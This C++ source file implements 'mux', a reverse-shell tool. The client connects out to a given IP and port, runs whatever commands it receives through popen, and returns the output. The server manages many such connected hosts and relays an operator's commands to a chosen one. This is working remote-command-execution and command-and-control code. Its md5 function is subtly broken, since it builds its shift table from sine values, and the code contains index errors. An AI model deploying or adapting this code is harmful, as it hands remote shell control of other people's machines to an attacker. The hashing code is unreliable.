//#define _MUX_DEBUG 1
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <math.h>
#include <unistd.h>
#include <sys/time.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <thread>
#include <atomic>

#define Iscint(c) (c>='0' && c <='9') ? 0 : 1
#define muxhelp "\
Usage: mux [port] [port] [key]\n\
   or: mux [ip] [port] [name]\n"

void printpath();
void muxserver(int argc, char* argv[]);
void muxclient(int argc, char* argv[]);
void md5(const char* initial_msg, char* digest);
char* muxRandom();
void mux_server_send(int muxport, char*& passwd);
void handle_new_connection(int& server);
void check_client_connection(std::vector<pollfd>& fds);

int main(int argc, char* argv[]) {
    switch (argc)
    {
    case 1:
        printf("%s", muxhelp);
        break;
    case 2:
        if (argv[1][0] == 'P' && argv[1][1] == 'H')
            printpath();
        else
            printf("%s", muxRandom());
        break;
    case 3:
        if (Iscint(argv[1][0])) { printf("%s", muxRandom()); break; }
        if (strchr(argv[1], '.'))
            muxclient(argc, argv);
        else
            printf("%s", muxRandom());
        break;
    case 4:
        if (Iscint(argv[1][0])) { printf("%s", muxRandom()); break; }
        if (!strchr(argv[1], '.')) //不包含.为端口
            muxserver(argc, argv);
        else
            muxclient(argc, argv);
        break;
    default:
        printf("%s", muxRandom());
    }
}

int mux_selected = 0; //当前选择的客户端序号
int mux_history_num = 0;
char mux_passwd[2048];
char mux_history[4096];
char muxPasswdHistory[2048];
bool mux_recv_control_check = true;

struct muxClient {
    int s = -1;
    int num = 0;
    char name[1024];
    char time[32];
    char passwdmd5[33];
    time_t last_active;
};

std::vector<muxClient> muxclients;
std::vector<pollfd> fds;
int mux_control = -1;

int sendmsg(int& sock, char* data) {
    int len = strlen(data);
    int lindex = 0;
    while (len > 1024) {
        int tlen = 1024;
        send(sock, (char*)&tlen, sizeof(int), 0);
        send(sock, (data + (1024 * lindex)), tlen, 0);
        lindex++;
        len -= 1024;
    }
    send(sock, (char*)&len, sizeof(int), 0);
    send(sock, (data + (1024 * lindex)), len, 0); return 1;
}

int recvmsg(int& sock, char* data) {
    int recvLen;
    int data_recv = recv(sock, (char*)&recvLen, sizeof(int), 0);
#ifdef _MUX_DEBUG
    printf("recvmsg[%d]:", recvLen);
#endif
    if (data_recv <= 0) return data_recv;
    if (recvLen > 1024) recvLen = 1024;
    data_recv = recv(sock, data, recvLen, 0);
    if (data_recv <= 0) return data_recv;
    data[data_recv] = '\0';
#ifdef _MUX_DEBUG
    printf("[%d]:'%s'\n", data_recv, data);
#endif
    if (data_recv == recvLen) return recvLen; return data_recv;
}

void printpath() {
    char Current_path[1024];
    char* pwd = getcwd(Current_path, 1024);
    printf("[%s]$ ", Current_path);
}

int is_gbk(const char* str) {
    // Linux下简化GBK检测
    for (int i = 0; str[i]; i++) {
        if ((unsigned char)str[i] > 0x7F) {
            if (i + 1 >= strlen(str)) return 0;
            if ((unsigned char)str[i + 1] < 0x40 || (unsigned char)str[i + 1] > 0xFE) return 0;
            i++;
        }
    }
    return 1;
}

void mux_write_history(muxClient& _client_, int& client, const char& _condition) {
    time_t now = time(NULL);
    struct tm* sysTime_t = localtime(&now);
    char title[1024];
    sprintf(title, "%d-%02d-%02d %02d:%02d:%02d.%03d",
        1900 + sysTime_t->tm_year, 1 + sysTime_t->tm_mon, sysTime_t->tm_mday,
        sysTime_t->tm_hour, sysTime_t->tm_min, sysTime_t->tm_sec, (int)(time(NULL) % 1000)
    );
    strcpy(_client_.time, title);
    if (_condition == '+') {
        _client_.s = client;
        _client_.num = mux_history_num;
        _client_.last_active = now;
        muxclients.push_back(_client_); // 添加到客户端列表
    }
    if (!strncmp(_client_.name, "GET", 3)) return;
    if (_client_.name[0] == '\0') return;
    if (!is_gbk(_client_.name)) return;
    sprintf(
        title,
        "[%s] %c R%d #%d %s",
        _client_.time,
        _condition,
        _client_.num,
        muxclients.size() - 1,
        _client_.name
    );
    while ((strlen(mux_history) + strlen(title) + 2) > 4096) {
        char* pos = strchr(mux_history, '\n');
        if (pos != nullptr) {
            int index = pos - mux_history + 1; // +1 to remove the '\n'
            strcpy(mux_history, mux_history + index);
        }
    }
    strcat(mux_history, title);
    strcat(mux_history, "\n\0");
}

void* mux_recv_control(void* arg) {
    char revdata[1024 + 1];
    char mux_title[256];
    char time_str[20];
    struct tm* time_info;
    int ret = 0;
    int index_mux_recv_control = 0;
    while (1) {
        time_t current_time = time(nullptr);
        time_info = localtime(&current_time);
        strftime(time_str, sizeof(time_str), "%H:%M:%S", time_info);
        ret = recvmsg(mux_control, revdata);
        if (ret > 0) {
            if (!(revdata[0] == ' ' && revdata[1] == '\0')) fwrite(revdata, 1, ret, stdout);
        }
        else {
            usleep(1000000);
            if (index_mux_recv_control++ > 3) break;
        }
    }
    mux_recv_control_check = false;
    return NULL;
}

void* mux_client_heart_beat(void* arg) {
    while (1) {
        usleep(60000000);
        send(mux_control, " ", 2, 0);
#ifdef _MUX_DEBUG
        printf("mux_client_heart_beat(\" \");\n");
#endif
    }
    return NULL;
}

void* mux_control_heart_beat(void* arg) {
    char control_heart_beat[2] = " ";
    while (1) {
        usleep(60000000);
        sendmsg(mux_control, control_heart_beat);
#ifdef _MUX_DEBUG
        printf("mux_control_heart_beat(\" \");\n");
#endif
    }
    return NULL;
}

#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))

void md5(const char* initial_msg, char* digest) {
    uint32_t s[64], K[64];
    uint32_t i, msg_len;
    uint32_t a0 = 0x67452301;
    uint32_t b0 = 0xEFCDAB89;
    uint32_t c0 = 0x98BADCFE;
    uint32_t d0 = 0x10325476;
    for (i = 0; i < 64; i++) {
        s[i] = (uint32_t)(1LL << 32) * fabs(sin(i + 1));
    }
    for (i = 0; i < 64; i++) {
        K[i] = (uint32_t)(1LL << 32) * fabs(sin(i + 1));
    }
    char* msg = strdup(initial_msg);
    msg_len = strlen(msg);
    uint32_t bit_len = msg_len * 8;
    msg = (char*)realloc(msg, msg_len + 64 + 1);
    msg[msg_len] = 0x80;
    memset(msg + msg_len + 1, 0, 64 - ((msg_len + 1) % 64));
    *(uint64_t*)(msg + msg_len + 1 + 64 - 8) = bit_len;
    for (i = 0; i < msg_len + 1 + 64; i += 64) {
        uint32_t* M = (uint32_t*)(msg + i);
        uint32_t A = a0, B = b0, C = c0, D = d0;
        uint32_t j, temp;
        for (j = 0; j < 64; j++) {
            uint32_t F, g;
            if (j < 16) {
                F = (B & C) | ((~B) & D);
                g = j;
            }
            else if (j < 32) {
                F = (D & B) | ((~D) & C);
                g = (5 * j + 1) % 16;
            }
            else if (j < 48) {
                F = B ^ C ^ D;
                g = (3 * j + 5) % 16;
            }
            else {
                F = C ^ (B | (~D));
                g = (7 * j) % 16;
            }
            temp = D;
            D = C;
            C = B;
            B = B + LEFTROTATE((A + F + K[j] + M[g]), s[j]);
            A = temp;
        }
        a0 += A;
        b0 += B;
        c0 += C;
        d0 += D;
    }
    snprintf(digest, 33, "%08x%08x%08x%08x", a0, b0, c0, d0);
    free(msg);
}

char* muxRandom() {
    time_t t = time(NULL);
    char timestamp[20];
    snprintf(timestamp, 20, "%ld", t);
    int pid = getpid();
    char pid_str[20];
    snprintf(pid_str, 20, "%d", pid);
    char seed[40];
    snprintf(seed, 40, "%s%s", timestamp, pid_str);
    char* md5_hash = (char*)malloc(33);
    md5(seed, md5_hash);
    return md5_hash;
}

void muxserver(int argc, char* argv[]) {
    std::atomic<bool> running(true);
    
    std::thread server_send_thread([&]() {
        try {
            mux_server_send(0, argv[3]);
        } catch (const std::exception& e) {
            printf("Server send thread error: %s\n", e.what());
        }
    });
    
    std::thread control_recv_thread([&]() {
        try {
            mux_server_send(atoi(argv[2]), argv[3]);
        } catch (const std::exception& e) {
            printf("Control receive thread error: %s\n", e.what());
        }
    });
    
    server_send_thread.detach();
    control_recv_thread.detach();

    while (running) {
        int server = socket(AF_INET, SOCK_STREAM, 0);
        if (server < 0) {
            printf("Failed to create socket\n");
            continue;
        }
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(atoi(argv[1]));
        
        if (bind(server, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("Failed to bind socket\n");
            close(server);
            continue;
        }
        
        if (listen(server, SOMAXCONN) < 0) {
            printf("Failed to listen on socket\n");
            close(server);
            continue;
        }
        
        int muxWSAPoll = 0;
        while (running) {
            fds.clear();
            fds.push_back({ server, POLLIN, 0 });
            for (muxClient& client : muxclients) {
                fds.push_back({ client.s, POLLIN, 0 });
            }
            
            int ret = poll(fds.data(), fds.size(), 30000);
            if (ret < 0) {
                printf("Poll error\n");
                break;
            }
            
            if (ret > 0) {
                if (fds[0].revents & POLLIN) {
#ifdef _MUX_DEBUG
                    printf("handle_new_connection(server);\n");
#endif
                    handle_new_connection(server);
                }
                check_client_connection(fds);
            }
            else {
                check_client_connection(fds);
            }
            
            char buffer[256];
            sprintf(buffer, "COUNT = %d , RET=%d , FDS.SIZE = %d , MUX.SIZE = %d", 
                    muxWSAPoll++, ret, fds.size(), muxclients.size());
            printf("\033]0;%s\007", buffer);
            
            if (muxWSAPoll > 10000) muxWSAPoll = 0;
            
            if (muxclients.empty()) {
                printf("[0]$ ");
                continue;
            }
            
            if (fds.empty()) {
                printf("No active connections\n");
                continue;
            }
        }
        close(server);
    }
}

void muxclient(int argc, char* argv[]) {
    char buffer[1024];
    FILE* fp = NULL;
    struct timeval timeout;
    timeout.tv_sec = 120000;
    timeout.tv_usec = 0;
    struct sockaddr_in addr;
    int index_muxclient = 1;
    char password[1024];
    if (argc == 4) {
        strcpy(password, argv[3]);
    }
    else {
        char* md5_Random = muxRandom();
        strcpy(password, md5_Random);
        printf("%s\n", password);
        free(md5_Random);
    }
    while (1) {
        mux_control = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        setsockopt(mux_control, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(argv[1]);
        addr.sin_port = htons(atoi(argv[2]));
        connect(mux_control, (struct sockaddr*)&addr, sizeof(addr));
        sendmsg(mux_control, password);
        buffer[0] = '\0';
        int ret = recvmsg(mux_control, buffer);
        bool client_mux_control = false;
        if (ret > 0) {
            if (buffer[0] == '$') {
                if (buffer[1] == '$') {
                    client_mux_control = true;
                    pthread_t thread;
                    pthread_create(&thread, NULL, mux_client_heart_beat, NULL);
                    pthread_detach(thread);
                }
                else {
                    pthread_t thread;
                    pthread_create(&thread, NULL, mux_control_heart_beat, NULL);
                    pthread_detach(thread);
                }
                recvmsg(mux_control, buffer);
                if (!strcmp(buffer, "PASSWORD ERROR")) return;
                if (strcmp(buffer, argv[3]) && buffer[0] != '$') return;
                printf("$ ");
                pthread_t thread;
                pthread_create(&thread, NULL, mux_recv_control, NULL);
                pthread_detach(thread);
                while (mux_recv_control_check) {
                    memset(buffer, '\0', sizeof(buffer));
                    fgets(buffer, sizeof(buffer), stdin);
                    buffer[strcspn(buffer, "\n")] = 0;
                    if (buffer[0] == ';') { close(mux_control); return; }
                    if (buffer[0] == '\0') { printf("$ "); continue; }
                    if (!strcmp(buffer, "cls")) system("clear");
                    if (client_mux_control)
                        send(mux_control, buffer, strlen(buffer), 0);
                    else
                        sendmsg(mux_control, buffer);
                }
                return;
            }
            else if (buffer[0] != '#') { close(mux_control); usleep(1000000); continue; }
        }
        else { close(mux_control); usleep(1000000); continue; }
        if (index_muxclient) {
            index_muxclient = 0;
            pthread_t thread;
            pthread_create(&thread, NULL, mux_client_heart_beat, NULL);
            pthread_detach(thread);
        }
        printf("$ ");
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            ret = recvmsg(mux_control, buffer);
            if (ret > 0) { if (buffer[0] == ' ' && buffer[1] == '\0') continue; }
            else break;
            printf("%s\n", buffer);
            if (!strcmp(buffer, "cls")) {
                system("clear");
                strcpy(buffer, "\"");
                strcat(buffer, argv[0]);
                strcat(buffer, "\" PH");
            }
            else {
                strcat(buffer, " 2>&1&echo;&\"");
                strcat(buffer, argv[0]);
                strcat(buffer, "\" PH");
            }
            fp = popen(buffer, "r");
            if (!fp) { continue; }
            int fgets_tmp = 0;
            while (fgets(buffer, sizeof(buffer) - 1, fp) != 0) {
                fgets_tmp++;
                printf("%s", buffer);
                send(mux_control, buffer, strlen(buffer), 0);
            }
            if (fgets_tmp != 0) {
                buffer[strlen(buffer) - 3] = '\0';
                chdir(buffer + 1);
            }
            pclose(fp);
        }
        usleep(1000000);
        close(mux_control);
    }
}

void mux_server_send(int muxport, char*& passwd) {
    char buffer[1024];
    char muxPasswdTime[1024];
    muxPasswdTime[0] = '\0';
    int smux_control;
    struct sockaddr_in sin;
    struct timeval timeout;
    timeout.tv_sec = 240000;
    timeout.tv_usec = 0;
    time_t mux_control_time = time(nullptr);
    
    if (muxport) {
        smux_control = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(muxport);
        sin.sin_addr.s_addr = INADDR_ANY;
        bind(smux_control, (struct sockaddr*)&sin, sizeof(sin));
        listen(smux_control, 5);
    }
    
    do {
        if (muxport) {
            setsockopt(smux_control, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            int nAddrlen = sizeof(sin);
            mux_control = accept(smux_control, (struct sockaddr*)&sin, (socklen_t*)&nAddrlen);
            strcpy(buffer, "$CONTROL");
            sendmsg(mux_control, buffer);
            recvmsg(mux_control, buffer);
            time_t muxPasswdTimeNow = time(NULL);
            struct tm* sysTime_t = localtime(&muxPasswdTimeNow);
            sprintf(muxPasswdTime, "[%d-%02d-%02d %02d:%02d:%02d.%03d] ",
                1900 + sysTime_t->tm_year, 1 + sysTime_t->tm_mon, sysTime_t->tm_mday,
                sysTime_t->tm_hour, sysTime_t->tm_min, sysTime_t->tm_sec, (int)(time(NULL) % 1000)
            );
            while ((strlen(muxPasswdHistory) + strlen(buffer) + strlen(muxPasswdTime) + 2) > 2048) {
                char* pos = strchr(muxPasswdHistory, '\n');
                if (pos != nullptr) {
                    int index = pos - muxPasswdHistory + 1;
                    strcpy(muxPasswdHistory, muxPasswdHistory + index);
                }
            }
            strcat(muxPasswdHistory, muxPasswdTime);
            strcat(muxPasswdHistory, buffer);
            strcat(muxPasswdHistory, "\n");
            if (strcmp(buffer, passwd)) {
                strcpy(buffer, "PASSWORD ERROR");
                sendmsg(mux_control, buffer);
                usleep(1000000);
                close(mux_control);
                continue;
            }
            else sendmsg(mux_control, buffer);
        }
        
        printf("                   \r[%d]$ ", mux_selected);
        while (true) {
            memset(buffer, '\0', sizeof(buffer));
            time_t current_time = time(nullptr);
            if (muxport) {
                setsockopt(mux_control, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
                if (recvmsg(mux_control, buffer) > 0) {
                    mux_control_time = current_time;
                    if (buffer[0] == 0 || buffer[0] == ' ' && buffer[1] == 0) continue;
                    printf("%s\n", buffer);
                }
                else break;
#ifdef _MUX_DEBUG
                printf("mux_server_send(current_time-mux_control_time>120)[%lld-%lld=%lld]\n", current_time, mux_control_time, current_time - mux_control_time);
#endif
                if ((current_time - mux_control_time) > 240) break;
            }
            else {
                if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
                    buffer[strcspn(buffer, "\n")] = 0;  // 移除换行符
                }
            }
            
            if (buffer[0] == '\0') {
                printf("[%d]$ ", mux_selected);
                continue;
            }
            if (!strcmp(buffer, "cls")) {
                system("clear");
                // continue;
            }
            if (buffer[0] == '/') {
                if (buffer[1] == '/') {
                    printf("%s", muxPasswdHistory);
                    if (muxport) sendmsg(mux_control, muxPasswdHistory);
                    sprintf(buffer, "[%d]$ ", mux_selected);
                    printf("%s", buffer);
                    if (muxport) sendmsg(mux_control, buffer);
                    continue;
                }
                // 显示客户端列表
                int max_length_Cli_name = 0;
                int length_num_max = 0;
                for (size_t i = 0; i < muxclients.size(); ++i) {
                    if (strlen(muxclients[i].name) > max_length_Cli_name) max_length_Cli_name = strlen(muxclients[i].name);
                    if (muxclients[i].num > length_num_max) length_num_max = muxclients[i].num;
                }
                int numDigits = 0;
                while (length_num_max != 0) {
                    length_num_max /= 10;
                    ++numDigits;
                }
                length_num_max = numDigits;
                int count = 0;
                int number = muxclients.size() - 1;
                while (number != 0) {
                    number = number / 10;
                    ++count;
                }
                time_t current_time = time(nullptr);
                for (size_t i = 0; i < muxclients.size(); ++i) {
                    sprintf(buffer, "#%*d %*s R%*d [%s %lld]\n",
                        -count, i, -max_length_Cli_name, muxclients[i].name,
                        -length_num_max, muxclients[i].num, muxclients[i].time,
                        current_time - muxclients[i].last_active);
                    printf("%s", buffer);
                    if (muxport) sendmsg(mux_control, buffer);

                    if ((current_time - muxclients[i].last_active) > 240) {
                        close(fds[i - 1].fd);
                        mux_write_history(muxclients[i], fds[i - 1].fd, '-');
                        muxclients.erase(muxclients.begin() + i); --i;
                        fds.erase(fds.begin()); --i;
                    }
                }
                sprintf(buffer, "[%d]$ ", mux_selected);
                printf("%s", buffer);
                if (muxport) sendmsg(mux_control, buffer);
                continue;
            }
            if (buffer[0] == '#') {
                if (buffer[1] == '\0') {
                    printf("%s", mux_history);
                    if (muxport) sendmsg(mux_control, mux_history);
                    sprintf(buffer, "[%d]$ ", mux_selected);
                    printf("%s", buffer);
                    if (muxport) sendmsg(mux_control, buffer);
                    continue;
                }
                mux_selected = atoi(buffer + 1);
                sprintf(buffer, "[%d]$ ", mux_selected);
                printf("%s", buffer);
                if (muxport) sendmsg(mux_control, buffer);
            }
            else {
                if (muxclients.size() <= mux_selected || (sendmsg(muxclients[mux_selected].s, buffer) <= 0)) {
                    sprintf(buffer, "[%d]$ ", mux_selected);
                    printf("%s", buffer);
                    if (muxport) sendmsg(mux_control, buffer);
                }
                else {
                    if (!muxport) {
                        strcat(buffer, "\n");
                        sendmsg(mux_control, buffer);
                    }
                }
            }
        }
        close(mux_control);
    } while (muxport);
}

void handle_new_connection(int& server) {
    int client = accept(server, NULL, NULL);
    muxClient _client_;
    if (client != -1) {
        memset(_client_.name, 0, sizeof(_client_.name));
        recvmsg(client, _client_.name);
        char mux_history_num_str[256];
        int muxclients_name_recv = 0;
        if (_client_.name[0] == 'm' && _client_.name[1] == 'u' && _client_.name[2] == 'x' && _client_.name[3] == ':') {
            strcpy(mux_history_num_str, "$$muxcclient");
            sendmsg(client, mux_history_num_str);
            for (int i = muxclients.size() - 1; i >= 0; --i) {
#ifdef _MUX_DEBUG
                printf("_client_.name+4[%s] == muxclients[%d].name:[%s]\n", _client_.name + 4, i, muxclients[i].name);
#endif
                if (!strcmp(_client_.name + 4, muxclients[i].name)) {
                    muxclients_name_recv = 1;
                    break;
                }
            }
            if (!muxclients_name_recv) {
                strcpy(mux_history_num_str, "PASSWORD ERROR");
                sendmsg(client, mux_history_num_str);
            }
        }
        mux_write_history(_client_, client, '+');
        if (muxclients_name_recv)
            sprintf(mux_history_num_str, "$%d", ++mux_history_num);
        else
            sprintf(mux_history_num_str, "#%d", ++mux_history_num);
        sendmsg(client, mux_history_num_str);
    }
}

void check_client_connection(std::vector<pollfd>& fds) {
    time_t current_time = time(nullptr);
    char mux_Heart_beat[2] = " ";
    for (int i = 1; i < fds.size(); ++i) {
        if (fds[i].revents & POLLHUP) {
#ifdef _MUX_DEBUG
            printf("closesocket(fds[%d].fd)\n", i);
#endif
            close(fds[i].fd);
            fds.erase(fds.begin() + i);
            --i;
#ifdef _MUX_DEBUG
            printf("mux_write_history(muxclients[%d])\n", i);
#endif
            mux_write_history(muxclients[i], fds[i].fd, '-');
            muxclients.erase(muxclients.begin() + i); 
            // --i;
            
            // 重置 mux_selected
            if (muxclients.empty()) {
                mux_selected = 0;
            } else if (mux_selected >= muxclients.size()) {
                mux_selected = muxclients.size() - 1;
            }
        }
        else if (fds[i].revents & POLLIN) {
            char buffer[1024 + 1];
            memset(buffer, '\0', sizeof(buffer));
            int n = recv(fds[i].fd, buffer, 1024, 0);
            usleep(1000);
#ifdef _MUX_DEBUG
            printf("WSAPoll(fds[%d].fd):'%s'\n", i, buffer);
            printf("muxclients[%d-1].name:%s\n", i, muxclients[i - 1].name);
#endif
            if (n > 0) {
                muxclients[i - 1].last_active = current_time;
                if (buffer[0] == ' ' && buffer[1] == '\0') continue;
                if (muxclients[mux_selected].s == fds[i].fd) {
                    printf("%s", buffer);
                    sendmsg(mux_control, buffer);
                }
                for (int m = muxclients.size() - 1; m >= 0; --m) {
#ifdef _MUX_DEBUG
                    printf("muxclients[%d-1].name+4[%s] == muxclients[%d].name:[%s]\n", i, muxclients[i - 1].name + 4, m, muxclients[m].name);
#endif
                    if (!strcmp(muxclients[i - 1].name + 4, muxclients[m].name)) {
                        if (muxclients[i - 1].name[0] == 'm' && muxclients[i - 1].name[1] == 'u' && muxclients[i - 1].name[2] == 'x' && muxclients[i - 1].name[3] == ':') {
                            sendmsg(muxclients[m].s, buffer);
                            if (mux_selected == m) {
                                strcat(buffer, "\n");
                                printf("%s", buffer);
                                sendmsg(mux_control, buffer);
                            }
                            break;
                        }
                    }
                    if (!strcmp(muxclients[i - 1].name, muxclients[m].name + 4)) {
                        if (muxclients[m].name[0] == 'm' && muxclients[m].name[1] == 'u' && muxclients[m].name[2] == 'x' && muxclients[m].name[3] == ':') {
                            sendmsg(muxclients[m].s, buffer);
                            break;
                        }
                    }
                }
            }
            else usleep(500000);
        }
        else sendmsg(fds[i].fd, mux_Heart_beat);
        if (i > 0) {
#ifdef _MUX_DEBUG
            printf("%lld - %lld = %lld > 240\n", current_time, muxclients[i - 1].last_active, current_time - muxclients[i - 1].last_active);
#endif
            if ((current_time - muxclients[i - 1].last_active) > 240) {
#ifdef _MUX_DEBUG
                printf("muxclients[%d] = %s - (fds[%d].fd);\n", i - 1, muxclients[i - 1].name, i);
#endif
                close(fds[i].fd);
                mux_write_history(muxclients[i - 1], fds[i].fd, '-');
                muxclients.erase(muxclients.begin() + i - 1);
                --i;
                fds.erase(fds.begin() + i);
                // --i;
            }
        }
    }
}